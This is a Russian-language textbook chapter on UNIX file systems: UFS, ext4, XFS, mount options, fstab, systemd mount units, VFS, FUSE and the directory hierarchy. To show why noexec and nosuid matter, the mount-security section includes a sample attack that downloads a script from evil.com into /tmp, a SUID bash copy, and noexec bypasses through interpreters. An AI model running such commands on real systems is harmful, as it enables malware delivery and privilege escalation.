# Глава 36. Классические файловые системы UNIX

## Введение

UNIX-подобные системы используют **иерархическую файловую систему** с единым корнем `/`. Понимание классических ФС помогает разобраться в современных решениях, которые унаследовали их концепции.

---

## 36.1 Историческая эволюция

```
1969  ──▶  PDP-7 FS (оригинальная UNIX ФС)
1974  ──▶  UNIX V6 FS (первая документированная)
1978  ──▶  UNIX V7 FS (512 байт блоки)
1983  ──▶  BSD FFS (Fast File System)
1984  ──▶  System V FS (S5FS)
1991  ──▶  ext (Linux)
1993  ──▶  ext2
2001  ──▶  ext3 (журналирование)
2008  ──▶  ext4
```

---

## 36.2 Berkeley Fast File System (FFS/UFS)

### Ключевые инновации

FFS (также известная как UFS) представила революционные идеи:

1. **Группы цилиндров**: данные размещаются близко к метаданным
2. **Большие блоки**: 4-8 KB вместо 512 байт
3. **Фрагменты**: эффективное хранение малых файлов
4. **Ротационные задержки**: учёт физики жёстких дисков

### Структура UFS

```
┌────────────────────────────────────────┐
│  Boot Block (16 KB)                    │
├────────────────────────────────────────┤
│  Superblock                            │
├────────────────────────────────────────┤
│  Cylinder Group 0                      │
│  ├── Backup Superblock                 │
│  ├── Cylinder Group Descriptor         │
│  ├── Inode Bitmap                      │
│  ├── Block Bitmap                      │
│  ├── Inode Table                       │
│  └── Data Blocks                       │
├────────────────────────────────────────┤
│  Cylinder Group 1                      │
├────────────────────────────────────────┤
│  ...                                   │
└────────────────────────────────────────┘
```

### Работа с UFS (FreeBSD)

```bash
# Создание UFS2
newfs /dev/da0p1

# Монтирование
mount -t ufs /dev/da0p1 /mnt

# Проверка
fsck_ufs /dev/da0p1

# Включение soft updates
tunefs -n enable /dev/da0p1
```

---

## 36.3 ext2/ext3/ext4 (Linux)

### ext2 — Extended Filesystem 2

```
Год создания: 1993
Максимальный размер файла: 2 TB
Максимальный размер ФС: 32 TB
Размер блока: 1-4 KB
```

**Структура ext2:**

```
┌──────────────────────────────────────┐
│  Boot Block (1 KB)                   │
├──────────────────────────────────────┤
│  Block Group 0                       │
│  ├── Superblock                      │
│  ├── Group Descriptors               │
│  ├── Block Bitmap (1 блок)           │
│  ├── Inode Bitmap (1 блок)           │
│  ├── Inode Table                     │
│  └── Data Blocks                     │
├──────────────────────────────────────┤
│  Block Group 1                       │
├──────────────────────────────────────┤
│  ...                                 │
└──────────────────────────────────────┘
```

### ext3 — добавление журнала

```bash
# Три режима журналирования:

# journal (полный) - журнал метаданных и данных
tune2fs -o journal_data /dev/sda1

# ordered (по умолчанию) - данные до метаданных
tune2fs -o journal_data_ordered /dev/sda1

# writeback (быстрый) - только метаданные
tune2fs -o journal_data_writeback /dev/sda1
```

### ext4 — современный стандарт

**Улучшения ext4:**

| Возможность | ext3 | ext4 |
|-------------|------|------|
| Максимальный файл | 2 TB | 16 TB |
| Максимальная ФС | 32 TB | 1 EB |
| Подкаталогов | 32000 | 64000 |
| Extents | ❌ | ✅ |
| Multiblock allocation | ❌ | ✅ |
| Delayed allocation | ❌ | ✅ |
| Наносекунды в timestamps | ❌ | ✅ |

```bash
# Создание ext4
mkfs.ext4 /dev/sdb1

# С параметрами
mkfs.ext4 -b 4096 -L "DATA" -O ^has_journal /dev/sdb1

# Просмотр информации
dumpe2fs /dev/sdb1 | less

# Изменение параметров
tune2fs -L "NEW_LABEL" /dev/sdb1
tune2fs -c 30 -i 2w /dev/sdb1  # проверка каждые 30 монтирований или 2 недели
```

---

## 36.4 XFS

**XFS** создана SGI в 1993 году для IRIX, портирована в Linux в 2001.

### Особенности XFS

- **Журналирование метаданных**
- **Allocation Groups** для параллелизма
- **Extents** для эффективного хранения
- **Delayed allocation**
- **Online resize** (только увеличение)
- **Online defragmentation**

```bash
# Создание XFS
mkfs.xfs /dev/sdb1

# С параметрами
mkfs.xfs -f -L "XFSDATA" -d agcount=4 /dev/sdb1

# Информация
xfs_info /mount/point

# Расширение (online)
xfs_growfs /mount/point

# Дефрагментация
xfs_fsr /mount/point

# Проверка (только unmounted)
xfs_repair /dev/sdb1
```

### Сравнение ext4 vs XFS

| Критерий | ext4 | XFS |
|----------|------|-----|
| Мелкие файлы | Лучше | Хуже |
| Большие файлы | Хорошо | Лучше |
| Параллельный I/O | Хорошо | Лучше |
| Уменьшение размера | ✅ | ❌ |
| Recovery время | Дольше | Быстрее |

---

## 36.5 Монтирование и fstab

### Команда mount

```bash
# Простое монтирование
sudo mount /dev/sdb1 /mnt

# С опциями
sudo mount -t ext4 -o noatime,nodiratime /dev/sdb1 /mnt

# Только для чтения
sudo mount -o ro /dev/sdb1 /mnt

# Перемонтирование
sudo mount -o remount,rw /mnt
```

### /etc/fstab

```bash
# <устройство>  <точка>  <тип>  <опции>  <dump>  <pass>

UUID=550e8400-e29b-41d4-a716-446655440000  /        ext4  defaults              0  1
UUID=550e8400-e29b-41d4-a716-446655440001  /home    ext4  defaults,noatime      0  2
UUID=550e8400-e29b-41d4-a716-446655440002  /data    xfs   defaults,nofail       0  2
LABEL=SWAP                                  none     swap  sw                    0  0
```

### Общие опции монтирования

Опции монтирования делятся на **общие** (работают для любой ФС) и **специфичные** для конкретной файловой системы.

**Базовые опции:**

| Опция | Значение |
|-------|----------|
| `defaults` | rw,suid,dev,exec,auto,nouser,async |
| `ro` | Только чтение (read-only) |
| `rw` | Чтение и запись |
| `sync` | Синхронная запись (данные сразу на диск) |
| `async` | Асинхронная запись (по умолчанию, быстрее) |
| `auto` | Автомонтирование при `mount -a` |
| `noauto` | Не монтировать автоматически |
| `nofail` | Не останавливать загрузку при ошибке монтирования |

**Опции производительности:**

| Опция | Значение |
|-------|----------|
| `noatime` | Не обновлять время доступа (atime) |
| `nodiratime` | Не обновлять atime для каталогов |
| `relatime` | Обновлять atime только если atime < mtime (компромисс) |
| `strictatime` | Всегда обновлять atime (по умолчанию, медленнее) |
| `lazytime` | Обновлять atime в памяти, записывать на диск лениво |

**Опции безопасности:**

| Опция | Значение | Угроза, которую предотвращает |
|-------|----------|-------------------------------|
| `noexec` | Запретить выполнение файлов | Запуск вредоносных бинарников |
| `nosuid` | Игнорировать SUID/SGID биты | Эскалация привилегий через SUID |
| `nodev` | Игнорировать device-файлы | Создание фейковых устройств |

### Безопасность через опции монтирования

Правильная настройка опций — важный элемент **defense in depth** (эшелонированной защиты). Даже если атакующий загрузил вредоносный файл, ограничения монтирования могут предотвратить его выполнение.

**Типичные рекомендации:**

```bash
# /tmp — временные файлы, часто цель для эксплойтов
/dev/sda3  /tmp     ext4  defaults,noexec,nosuid,nodev  0  2

# /var/tmp — аналогично
/dev/sda4  /var/tmp ext4  defaults,noexec,nosuid,nodev  0  2

# /home — пользовательские данные, SUID не нужен
/dev/sda5  /home    ext4  defaults,nosuid,nodev         0  2

# /var — логи и данные сервисов
/dev/sda6  /var     ext4  defaults,nosuid,nodev         0  2

# Съёмные носители — максимальные ограничения
/dev/sdb1  /media/usb  vfat  noexec,nosuid,nodev,noauto,user  0  0
```

**Почему это работает:**

```
Атака: загрузка скрипта в /tmp и его выполнение
┌──────────────────────────────────────────────────────┐
│  $ wget http://evil.com/malware.sh -O /tmp/mal.sh   │
│  $ chmod +x /tmp/mal.sh                              │
│  $ /tmp/mal.sh                                       │
│  bash: /tmp/mal.sh: Permission denied  ← noexec!    │
└──────────────────────────────────────────────────────┘

Атака: создание SUID-бинарника в /home
┌──────────────────────────────────────────────────────┐
│  $ cp /bin/bash /home/user/bash_suid                │
│  $ chmod u+s /home/user/bash_suid  # требует root   │
│  $ /home/user/bash_suid -p                          │
│  # SUID бит игнорируется из-за nosuid               │
└──────────────────────────────────────────────────────┘
```

!!! warning "Ограничения noexec"
    `noexec` не защищает от:
    
    - `bash /tmp/script.sh` — интерпретатор вне /tmp
    - `python /tmp/evil.py` — аналогично
    - `ld-linux.so /tmp/binary` — прямой вызов загрузчика
    
    Это дополнительный барьер, а не полная защита!

### Опции для конкретных файловых систем

Помимо общих опций, каждая ФС имеет свои специфичные настройки:

**ext4:**

```bash
# Опции ext4
mount -t ext4 -o journal_checksum,discard,barrier /dev/sda1 /mnt
```

| Опция | Значение |
|-------|----------|
| `journal_checksum` | Контрольные суммы журнала |
| `discard` | Поддержка TRIM для SSD |
| `barrier` / `nobarrier` | Барьеры записи (целостность vs скорость) |
| `data=journal` | Журналирование данных (медленно, надёжно) |
| `data=ordered` | Метаданные после данных (по умолчанию) |
| `data=writeback` | Только метаданные (быстро, рискованно) |

**XFS:**

```bash
mount -t xfs -o logbufs=8,allocsize=64k /dev/sda1 /mnt
```

| Опция | Значение |
|-------|----------|
| `logbufs=N` | Количество буферов журнала (2-8) |
| `allocsize=SIZE` | Размер предвыделения для streaming writes |
| `inode64` | 64-битные номера inode (для больших ФС) |
| `norecovery` | Монтирование без воспроизведения журнала (ro) |

**Btrfs:**

```bash
mount -t btrfs -o compress=zstd,subvol=@home,space_cache=v2 /dev/sda1 /mnt
```

| Опция | Значение |
|-------|----------|
| `compress=ALG` | Сжатие: zlib, lzo, zstd (рекомендуется) |
| `subvol=NAME` | Монтирование конкретного subvolume |
| `space_cache=v2` | Кэш свободного пространства (v2 быстрее) |
| `autodefrag` | Автоматическая дефрагментация |
| `ssd` | Оптимизации для SSD |

**Просмотр текущих опций:**

```bash
# Все смонтированные ФС
$ mount | column -t

# Подробно для конкретной точки
$ findmnt /home
TARGET SOURCE    FSTYPE OPTIONS
/home  /dev/sda5 ext4   rw,nosuid,nodev,relatime

# Опции в /proc
$ cat /proc/mounts | grep /home
```

### Монтирование через systemd

В современных Linux-системах с systemd можно управлять монтированием через **mount units** (`.mount`) вместо `/etc/fstab`. Это даёт больше контроля: зависимости, условия, автоматический перезапуск.

!!! info "fstab vs systemd"
    systemd автоматически генерирует `.mount` юниты из `/etc/fstab` при загрузке. Можно использовать оба подхода, но для сложных сценариев (зависимости, сетевые ФС, шифрование) явные юниты удобнее.

**Именование юнитов:**

Имя файла `.mount` должно соответствовать точке монтирования с заменой `/` на `-`:

| Точка монтирования | Имя юнита |
|--------------------|-----------|
| `/mnt/data` | `mnt-data.mount` |
| `/home` | `home.mount` |
| `/var/lib/docker` | `var-lib-docker.mount` |
| `/mnt/my-data` | `mnt-my\x2ddata.mount` |

!!! warning "Дефис в именах директорий"
    Поскольку `-` используется как разделитель компонентов пути, дефис **внутри** имени директории нужно экранировать как `\x2d` (hex-код символа).
    
    Используйте `systemd-escape` для автоматического преобразования:
    
    ```bash
    # Путь → имя юнита
    $ systemd-escape --path /mnt/my-data
    mnt-my\x2ddata
    
    # Добавить суффикс .mount
    $ systemd-escape --path --suffix=mount /mnt/my-data
    mnt-my\x2ddata.mount
    
    # Обратное преобразование
    $ systemd-escape --unescape --path mnt-my\\x2ddata
    /mnt/my-data
    ```

**Пример: /mnt/data.mount**

```ini
# /etc/systemd/system/mnt-data.mount
[Unit]
Description=Data Storage Mount
After=local-fs.target
Requires=local-fs.target

[Mount]
What=/dev/disk/by-uuid/550e8400-e29b-41d4-a716-446655440000
Where=/mnt/data
Type=ext4
Options=defaults,noatime,nosuid,nodev

[Install]
WantedBy=multi-user.target
```

**Управление:**

```bash
# Применить изменения
sudo systemctl daemon-reload

# Монтировать
sudo systemctl start mnt-data.mount

# Автомонтирование при загрузке
sudo systemctl enable mnt-data.mount

# Статус
sudo systemctl status mnt-data.mount

# Размонтировать
sudo systemctl stop mnt-data.mount
```

**Automount — ленивое монтирование:**

`.automount` юниты монтируют ФС только при первом обращении к точке монтирования. Полезно для съёмных носителей и сетевых ФС.

```ini
# /etc/systemd/system/mnt-backup.automount
[Unit]
Description=Automount Backup Drive

[Automount]
Where=/mnt/backup
TimeoutIdleSec=300  # Размонтировать после 5 минут неактивности

[Install]
WantedBy=multi-user.target
```

```ini
# /etc/systemd/system/mnt-backup.mount
[Unit]
Description=Backup Drive

[Mount]
What=/dev/disk/by-label/BACKUP
Where=/mnt/backup
Type=ext4
Options=defaults,noexec,nosuid,nodev
```

```bash
# Включить automount (не .mount!)
sudo systemctl enable --now mnt-backup.automount

# Первое обращение триггерит монтирование
$ ls /mnt/backup  # ← mount происходит здесь
```

**Зависимости и порядок:**

Главное преимущество systemd — явные зависимости:

```ini
[Unit]
Description=Application Data
# Ждать сеть (для NFS)
After=network-online.target
Wants=network-online.target

# Ждать расшифровку LUKS
After=systemd-cryptsetup@encrypted.service
Requires=systemd-cryptsetup@encrypted.service

# Монтировать до запуска сервиса
Before=myapp.service
```

**Сравнение fstab и systemd mount:**

| Аспект | /etc/fstab | .mount юнит |
|--------|------------|-------------|
| Простота | ✅ Одна строка | Отдельный файл |
| Зависимости | Ограничены (x-systemd.*) | Полный контроль |
| Условия | Нет | `ConditionPathExists=`, etc. |
| Автоперезапуск | Нет | Да |
| Логи | `dmesg` | `journalctl -u name.mount` |
| Сетевые ФС | `_netdev` | Явные зависимости |

**Конвертация fstab → systemd:**

```bash
# Сгенерировать юнит из fstab (для просмотра)
$ systemd-mount --no-block -p "What=/dev/sda1" -p "Where=/mnt/test" --discover

# Посмотреть автосгенерированные юниты
$ systemctl list-units --type=mount

# Просмотр конкретного
$ systemctl cat home.mount
```

!!! tip "Когда использовать systemd mount"
    - Сетевые ФС (NFS, CIFS) с зависимостью от сети
    - Шифрованные тома (LUKS) с зависимостью от cryptsetup
    - Монтирование, требующее запущенного сервиса
    - Автоматическое размонтирование по таймауту
    - Интеграция с другими systemd юнитами
    
    Для простых локальных ФС `/etc/fstab` проще и понятнее.

---

## 36.6 Проверка и восстановление

### fsck

```bash
# Проверка ext4
sudo fsck.ext4 /dev/sdb1

# Автоматическое исправление
sudo fsck.ext4 -y /dev/sdb1

# Проверка всех ФС из fstab
sudo fsck -A
```

### Восстановление superblock

```bash
# Найти резервные копии superblock
sudo dumpe2fs /dev/sdb1 | grep -i superblock

# Использовать резервную копию
sudo e2fsck -b 32768 /dev/sdb1
```

---

## 36.7 VFS (Virtual File System)

### Что это?

**VFS** — это слой абстракции в ядре ОС, который предоставляет **единый интерфейс** для работы с разными файловыми системами. Без VFS каждая программа должна была бы знать, как работать с ext4, NTFS, FAT32 и т.д.

```mermaid
graph TB
    App["Приложение: cat /home/user/file.txt"]
    VFS["VFS: единый интерфейс<br/>open(), read(), write(), close()"]
    ext4["ext4 driver"]
    ntfs["NTFS driver"]
    nfs["NFS driver"]
    
    App --> VFS
    VFS --> ext4
    VFS --> ntfs
    VFS --> nfs
    
    ext4 --> disk1["/dev/sda2"]
    ntfs --> disk2["/dev/sdb1"]
    nfs --> network["Сетевой диск"]
```

VFS определяет набор операций, которые должен реализовать каждый драйвер ФС:

| Операция VFS | Что делает | Пример syscall |
|-------------|-----------|----------------|
| `lookup` | Найти файл по имени | `open("/etc/hosts")` |
| `read` | Прочитать данные | `read(fd, buf, size)` |
| `write` | Записать данные | `write(fd, buf, size)` |
| `readdir` | Прочитать содержимое директории | `ls /home` |
| `mkdir` | Создать директорию | `mkdir("new_dir")` |
| `unlink` | Удалить файл | `rm file.txt` |
| `stat` | Получить метаданные | `stat("/etc/hosts")` |

!!! note "Философское различие Unix vs Windows"
    **Unix/Linux:** Единое дерево директорий, начинающееся с `/`. Все диски монтируются в это дерево.
    
    **Windows:** Каждый диск — отдельное дерево с буквой (`C:\`, `D:\`, etc.)

### Bind Mounts: директория в двух местах

**Bind mount** позволяет «примонтировать» директорию в другое место дерева. Это НЕ symlink и НЕ копия — это та же самая директория, доступная по двум путям:

```bash
# Монтируем /home/user/project в /var/www/html
$ sudo mount --bind /home/user/project /var/www/html

# Теперь /var/www/html показывает содержимое /home/user/project
$ ls /var/www/html
index.html  style.css  # То же, что в /home/user/project

# Изменения видны в обоих местах
$ touch /home/user/project/new_file.txt
$ ls /var/www/html/new_file.txt
new_file.txt  # Появился!
```

**Отличия от symlink:**

| Аспект | Bind Mount | Symlink |
|--------|-----------|--------|
| Уровень | Ядро (VFS) | Файловая система |
| Виден в `ls -l` | Нет | Да (`l` тип) |
| Переживает reboot | Нет (без fstab) | Да |
| Chroot/container | Работает | Может сломаться |

**Типичное применение:**

- **Docker volumes** — bind mount хостовой директории в контейнер
- **chroot окружения** — `/dev`, `/proc`, `/sys` монтируются внутрь chroot
- **Разработка** — код в `$HOME`, а веб-сервер ищет в `/var/www`

```bash
# Постоянный bind mount через fstab
/home/user/project  /var/www/html  none  bind  0  0
```

---

## 36.8 FUSE — файловые системы в user-space

Обычно файловые системы работают **в ядре** — для написания новой ФС нужно писать kernel-модуль на C. **FUSE** (Filesystem in Userspace) позволяет создавать ФС как обычную программу:

```text
ls /mnt/myfs/
     │
     ▼
┌──────────────┐
│   VFS (ядро) │
└──────┬───────┘
       ▼
┌──────────────┐     ┌───────────────────────┐
│ FUSE (ядро)  │────→│ Ваша программа (user) │
└──────────────┘     │  Python, Go, Rust...  │
                     └───────────────────────┘
```

### Популярные FUSE-файловые системы

| Проект | Что делает | Установка |
|--------|-----------|-----------|
| **sshfs** | Монтирует удалённую ФС через SSH | `brew install sshfs` / `apt install sshfs` |
| **rclone mount** | Монтирует 40+ облачных хранилищ (Google Drive, S3, Dropbox) | `rclone mount gdrive: /mnt/gdrive` |
| **s3fs-fuse** | Монтирует S3-бакет как директорию | `s3fs bucket /mnt/s3 -o passwd_file=~/.s3cred` |
| **ntfs-3g** | NTFS на Linux/macOS (через FUSE) | Часто предустановлен |
| **apfs-fuse** | Чтение APFS на Linux | `apfs-fuse /dev/sda2 /mnt/apfs` |
| **encfs** | Шифрованная ФС поверх обычной | `encfs ~/.encrypted ~/decrypted` |

```bash
# sshfs — самое полезное применение FUSE
sshfs user@server:/data /mnt/server
ls /mnt/server/  # Файлы с удалённого сервера!
umount /mnt/server

# rclone — любое облако как директория
rclone mount google-drive: /mnt/gdrive --daemon
```

### Python: создание простейшей FUSE-ФС

```python
# pip install fusepy
from fuse import FUSE, FuseOSError, Operations
import errno, stat, time

class HelloFS(Operations):
    """ФС с одним файлом /hello, содержащим 'Hello, FUSE!'"""
    
    def getattr(self, path, fh=None):
        if path == "/":
            return dict(st_mode=stat.S_IFDIR | 0o755, st_nlink=2)
        elif path == "/hello":
            content = b"Hello, FUSE!\n"
            return dict(st_mode=stat.S_IFREG | 0o444, 
                       st_size=len(content), st_nlink=1)
        raise FuseOSError(errno.ENOENT)
    
    def readdir(self, path, fh):
        return [".", "..", "hello"]
    
    def read(self, path, size, offset, fh):
        if path == "/hello":
            content = b"Hello, FUSE!\n"
            return content[offset:offset + size]
        raise FuseOSError(errno.ENOENT)

# Монтирование: python hello_fs.py /mnt/hello
FUSE(HelloFS(), "/mnt/hello", foreground=True)
```

!!! tip "Идеи для FUSE-ФС"
    - **Wiki-FS**: директории = категории, файлы = статьи из Wikipedia API
    - **SQL-FS**: `cat /mnt/db/users/123.json` → SELECT из базы данных
    - **Git-FS**: монтирование любого коммита как read-only директории
    - **Tar-FS**: `archivemount archive.tar.gz /mnt/archive` — уже существует!

---

## 36.9 Стандартная иерархия каталогов Unix

Unix-подобные системы используют **единое дерево** с корнем `/`. Стандарт **FHS** (Filesystem Hierarchy Standard) определяет назначение каждого каталога:

```
/                          (корень — единственная точка входа)
├── bin/                   (базовые утилиты: ls, cp, cat)
├── boot/                  (загрузчик и ядро)
├── dev/                   (устройства: /dev/sda, /dev/null)
├── etc/                   (конфигурация: /etc/fstab, /etc/passwd)
├── home/                  (домашние каталоги пользователей)
│   ├── alice/
│   └── bob/
├── mnt/ и /media/         (точки монтирования)
├── proc/                  (псевдо-ФС: информация о процессах)
├── root/                  (домашний каталог root)
├── sys/                   (псевдо-ФС: информация о системе/устройствах)
├── tmp/                   (временные файлы, очищается при загрузке)
├── usr/                   (пользовательские программы)
│   ├── bin/               (основные команды)
│   ├── lib/               (библиотеки)
│   ├── local/             (локально установленное ПО)
│   └── share/             (архитектурно-независимые данные)
└── var/                   (изменяемые данные)
    ├── log/               (логи: syslog, auth.log)
    ├── mail/              (почтовые ящики)
    └── tmp/               (временные, переживают reboot)
```

### Исторический контекст: /usr и /var

!!! info "Почему /usr?"
    Название `/usr` — сокращение от «Unix System Resources», а не «user». Исторически в ранних UNIX использовался второй диск для пользовательских программ. Сегодня многие дистрибутивы объединяют `/bin` → `/usr/bin` и `/sbin` → `/usr/sbin` (**UsrMerge**).

| Каталог | Содержимое | Особенности |
|---------|-----------|-------------|
| `/bin`, `/sbin` | Базовые утилиты | В современных системах → symlink на `/usr/bin` |
| `/usr/local` | Локально собранное ПО | Не затрагивается пакетным менеджером |
| `/opt` | Крупные пакеты (Java, Chrome) | Каждый пакет в своём подкаталоге |
| `/var/run` → `/run` | PID-файлы, сокеты | tmpfs, очищается при загрузке |
| `/proc/self` | Текущий процесс | Symlink на `/proc/<PID>` |

### Различия между дистрибутивами

**FreeBSD** добавляет `/rescue/` (статически слинкованные утилиты для восстановления), `/usr/ports/` (дерево портов) и `/usr/src/` (исходники системы). Базовая система чётко отделена от пакетов: `/usr/bin` — система, `/usr/local/bin` — пакеты.

**OpenBSD** содержит ядро прямо в корне (`/bsd`, `/bsd.mp`, `/bsd.rd`), `/usr/xenocara/` (исходники X.org), а `/var/www/` используется как DocumentRoot для встроенного httpd.

---

## Резюме

| ФС | Журнал | Max файл | Max ФС | Лучше для |
|----|--------|----------|--------|-----------|
| ext2 | ❌ | 2 TB | 32 TB | Flash, /boot |
| ext3 | ✅ | 2 TB | 32 TB | Legacy |
| ext4 | ✅ | 16 TB | 1 EB | Универсальное |
| XFS | ✅ | 8 EB | 8 EB | Большие файлы |
| UFS2 | Soft Updates | 32 PB | 32 PB | FreeBSD |

??? question "Упражнения"
    **Задание 1.** Создайте ext4 файловую систему на loop-устройстве: `mkfs.ext4 /dev/loop0`. Смонтируйте и исследуйте через `dumpe2fs`.
    
    **Задание 2.** Сравните XFS и ext4: создайте обе ФС на одинаковых устройствах, скопируйте одинаковые данные, сравните `df`, скорость операций.
    
    **Задание 3.** Проверьте журнал ext4: `debugfs /dev/loop0` → `logdump`. Какая информация хранится в журнале?

!!! tip "Следующая глава"
    Продолжим изучение файловых систем — **Windows: NTFS и ReFS** → [Windows FS](37-windows-fs.md)
